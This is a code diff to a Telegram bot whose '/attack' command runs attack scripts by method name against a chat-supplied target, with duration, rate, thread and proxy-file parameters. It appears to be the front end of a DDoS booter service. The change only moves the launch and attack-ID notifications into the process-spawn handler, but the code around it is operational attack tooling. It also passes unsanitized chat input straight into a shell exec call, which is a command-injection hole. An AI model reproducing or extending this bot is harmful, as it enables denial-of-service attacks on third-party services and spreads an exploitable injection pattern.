@@ -77,6 +77,11 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`)
     child.on('spawn', () => {
       attackData.pid = child.pid
+      bot.sendMessage(msg.chat.id, `🔴 *Attack Launched*\n\n` +
+        `*Method*: ${method}\n` +
+        `*Target*: ${target}\n` +
+        `*Time*: ${time}s`, { parse_mode: 'Markdown' })
+      bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`, { parse_mode: 'Markdown' })
     })
     child.on('error', (error) => {
       bot.sendMessage(msg.chat.id, `Child process error: ${error.message}`, { parse_mode: 'Markdown' })
@@ -84,17 +89,12 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     })
     child.on('exit', (code, signal) => {
       if (code === 0) {
-        bot.sendMessage(msg.chat.id, `🔴 *Attack Launched*\n\n` +
-          `*Method*: ${method}\n` +
-          `*Target*: ${target}\n` +
-          `*Time*: ${time}s`, { parse_mode: 'Markdown' })
         bot.sendMessage(msg.chat.id, `✅ Attack ${target} completed successfully`, { parse_mode: 'Markdown' })
       } else {
         bot.sendMessage(msg.chat.id, `Attack failed with code ${code || signal}`, { parse_mode: 'Markdown' })
       }
       attacks = attacks.filter(a => a.id !== attackId)
     })
-    bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`, { parse_mode: 'Markdown' })
   } catch (error) {
     bot.sendMessage(msg.chat.id, `Error starting attack: ${error.message}`, { parse_mode: 'Markdown' })
     attacks = attacks.filter(a => a.id !== attackId)
